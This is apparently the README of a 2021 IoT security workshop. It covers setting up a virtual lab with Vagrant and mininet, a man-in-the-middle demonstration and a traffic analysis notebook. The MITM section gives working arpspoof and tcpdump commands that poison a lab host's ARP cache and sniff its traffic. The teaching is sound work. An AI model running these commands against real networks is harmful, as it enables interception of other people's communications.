# Workshop

This workshop is a crash course on creating and analyzing an Internet of Things (IoT) network. The presenters will demonstrate how to set up an IoT lab that mimics a modern home network, how to capture traffic between devices, and how to analyze and visualize this data. They also will discuss basic packet altering methods and how to expand this setup to test different cybersecurity scenarios (ex. Man in the Middle Attack). Participants will learn skills that can apply to their career and home network (all skill levels welcome). To start, the presenters will demonstrate how to set up a hardware lab of devices (ex. Raspberry Pi) in common home network configurations. They will focus on setting up IoT devices of different capability levels that allow for transmitting, receiving and capturing data. They will analyze the data pulled from this setup to later determine network behavior and security risks. Next, they will instruct attendees on how to login to devices in the IoT lab as well as how to start capturing network traffic. Participants will learn and use common packet capturing and network analysis tools (ex. nmap). To mimic common malicious cybersecurity scenarios, the presenters will demonstrate how to delete or alter packets traveling between devices. Finally, this presentation will use Python to complete basic analysis and visualization of captured network traffic. Attendees will learn about different exploratory data pre-processing techniques, calculate statistics on the network, and use common visualization libraries to gain visual insight on the network’s behavior.

## Necessary Tools

To run the virtual part of this workshop, you will need to download the following dependencies:

* https://www.vagrantup.com/downloads
* https://www.virtualbox.org/wiki/Downloads

## Clone the GitHub Repo

```console
git clone https://github.com/stresearch/wicys-2021-iot.git
```

## Vagrant Setup (Testing in virtual network)

Vagrant is a tool for building and managing virtual machine environments. We're using it on this project to have a common dev environment for everyone in the workshop, regardless of whether they have a MacOS / Windows / Linux host machine. Vagrant can be used with different hypervisors, but for this workshop we'll be using VirtualBox. To create and configure the virtual machine, run the following commands:

```console
cd wicys-2021-iot/
vagrant plugin install vagrant-vbguest
vagrant up
```

## Create the Virtual Test Network

Now that our dev environment has been created, we will need to create the virtual test network within the environment. We will be using a utility called `mininet`.

* http://mininet.org

First, ssh into the dev environment:

```console
vagrant ssh
```

Now let's start up the virtual network:

```console
sudo mn --topo single,5 --nat
```

Once you run this, you'll be in the mininet CLI (command-line interface).

## Start the MITM attack

We were able to see the traffic from `tcpdump` because we executed the command from the "router" within our virtual test network. With the mitm attack, we will want to be able to see traffic from a host within the network that is not the router.

For this example, we will execute the mitm attack from `h1`, and target `h2`. In our dev environment, we can execute shell commands in `h1` using the following command:

```console
h1 BASH_COMMAND_HERE
```

First, we'll need to generate traffic from h2:

```console
h2 watch -n 5 curl www.icanhazip.com >/dev/null 2>&1 &
```

First, we'll try to sniff `h2` traffic from `h1`. To do this, we'll use `tcpdump`.

* https://linux.die.net/man/8/tcpdump

```console
h1 tcpdump -i h1-eth0 src host 10.0.0.2
```

After waiting a few seconds, it looks like we don't see any traffic...

So let's use arp poisoning! For that, we'll be using arpspoof:

* https://linux.die.net/man/8/arpspoof


```console
h1 arpspoof -i h1-eth0 -t 10.0.0.2 -r 10.0.0.6 
```

We can see the mac addresses that it is spoofing, let's run it in the background and silience the output so that stdout isn't distracting us:

```console
h1 arpspoof -i h1-eth0 -t 10.0.0.2 -r 10.0.0.6 >/dev/null 2>&1 &
```

Now that we are spoofing the arp packets, let's try to sniff the traffic from h2:

```console
h1 tcpdump -i h1-eth0 src host 10.0.0.2 and not arp
```

Now we see traffic! :)

## Analysis

Now to do analysis, we're going to get jupyter notebook running.
```console
cd wicys-2021-iot/analysis/
jupyter-notebook --ip=0.0.0.0
```

Copy the last URL and type it into your browser, and you'll be able to access the notebooks. Open `wicys-iot-workshop-analysis.ipynb`
